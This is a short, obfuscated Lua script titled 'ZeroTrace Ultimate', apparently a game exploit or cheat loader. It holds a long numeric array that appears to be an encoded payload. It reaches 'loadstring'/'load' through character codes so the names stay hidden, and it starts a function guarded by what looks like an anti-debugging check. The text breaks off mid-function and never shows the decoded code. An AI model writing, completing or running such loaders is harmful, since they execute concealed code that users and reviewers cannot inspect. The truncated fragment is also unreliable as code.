--[[ZeroTrace Ultimate]]
local _0xF1="0x"..tostring(math.random(1000,9999))local _0xF2=bit32 and bit32.bxor(123,456)or 579 local _j={658,7137,3764,6350,9910,2014,6451,828,531,9515,3066,4874,4133,7887,3616,6942,7264,2723,5723,9876,9663,379,3090,3768,4611,1744,4575,2055,5265,8628,5278,7859,3895,6489,1984,7128,429,569,9977,7751,3253,3407,2844,3299,2657,520,4686,4924,95,3231,5710,2398,1472,6844,5940,3326,6509,8875,1711,4280,4959,3361,100,9873,7348,4382,1323,1758,8228,8881,4427,4924,3527,8686,826,6235,4565,7925,9752,8807,2661,1171,7460,3708,9238,4645,9019,6583,674,1999,5316,7894,1528,686,9481,34,9944,8607,5926,5382,7778,8164,7891,6877,507,9245,9907,7038,5346,7588,2235,5292,2901,3548,6276,334,5565,888,8290,662,519,8095,9822,2177,396,9680,3166,6933,270,9861,3864,3427,4163,8919,4763,1084,9907,878,2472,423,8410,5284,7606,3132,9335,780,2946,6283,8750,7189,2422,4695,9073,1733,5901,4893,3778,4752,8927,6018,48,2382,6291,4496,2834,6386,3930,3542,9517,2757,3938,1594,2328,6021,6990,4837,510,5670,8072,5958,6011,5474,5009,416,8816,5304,7909,6640,3120,3893,5086,3397,1796,6568,6774,9633,6096,2453,2397,528,8492,5874,1612,5702,8019,1298,7317,4680,1232,8228,5030,2002,209,9271,1298,611,3358,1658,7903,6588,3255,766,3056,3662,4766,4963,2633,740,3340,5873,6853,7184,1980,7717,6809,7321,7663,8375,7487,7897,4206,7285,8412,6945,2898,7916,2625,5020,2903,2183,899,31,6156,2310,1962,6986,9450,966,5856,1019,6996,768,2614,623,8225,8597,1700,549,1537,7091,3675,6901,4327,8478,5052,9164,6685,9234,5149,1551,6340,7202,1099,6517,8520,2461,6171,4815,3768,6034,7756,5475,7971,6801,1775,689,4684,9614,8862,8578,} _m=string.char local _c=_m(99,104,97,114)local _e=(getfenv()[string.char(108,111,97,100,115,116,114,105,110,103)] or getfenv()[string.char(108,111,97,100)])local function _ex(_p,_k)if _db()then return
